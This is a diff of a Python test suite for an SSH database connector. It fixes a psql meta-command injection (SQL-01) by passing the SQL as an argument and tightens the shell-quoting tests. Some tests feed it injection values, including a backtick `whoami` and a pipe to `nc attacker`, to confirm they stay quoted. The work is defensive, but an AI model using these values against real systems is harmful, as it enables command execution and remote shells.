@@ -33,13 +33,19 @@ def make_config(**overrides) -> ConnectionConfig:
 
 
 class TestSSHExecConnectorBuildCommand:
-    def test_build_query_command_pipes_via_stdin(self):
+    def test_build_query_command_passes_the_sql_as_an_argument(self):
+        """Was `test_build_query_command_pipes_via_stdin`, asserting `"echo" in cmd`.
+
+        Piping the query to the client's stdin is SQL-01: psql reads a line beginning with
+        a backslash as a client meta-command, so `\\!` ran a shell command on the bastion.
+        The SQL is now an argument, where it is a statement and nothing else.
+        """
         connector = SSHExecConnector()
         connector._config = make_config()
         cmd, _ = connector._build_command("query", "SELECT 1")
-        assert "echo" in cmd
+        assert "echo" not in cmd
         assert "SELECT 1" in cmd
-        assert "|" in cmd
+        assert "-e 'SELECT 1'" in cmd
 
     def test_build_command_with_pre_commands(self):
         connector = SSHExecConnector()
@@ -282,10 +288,16 @@ class TestTemplateVarsAreShellQuoted:
         assert "'h`whoami`'" in self._cmd(db_host="h`whoami`")
 
     def test_a_quoted_value_adds_no_pipeline_stage(self):
-        """One pipe, the legitimate stdin one — the value's pipe stays inside quotes."""
+        """The value's pipe stays inside quotes — and there is no pipeline at all now.
+
+        This used to assert `cmd.count("| MYSQL_PWD") == 1`: exactly one pipe, the
+        legitimate one feeding the query to the client's stdin. That stage is gone with
+        SQL-01, so the requirement is stronger and simpler — a shell pipe in a config value
+        must not create one either.
+        """
         cmd = self._cmd(db_name="db|nc attacker 1")
         assert "'db|nc attacker 1'" in cmd, cmd
-        assert cmd.count("| MYSQL_PWD") == 1, cmd
+        assert "| MYSQL_PWD" not in cmd, cmd
 
     def test_a_missing_user_renders_an_explicit_empty_argument(self):
         cmd = self._cmd(db_user=None)
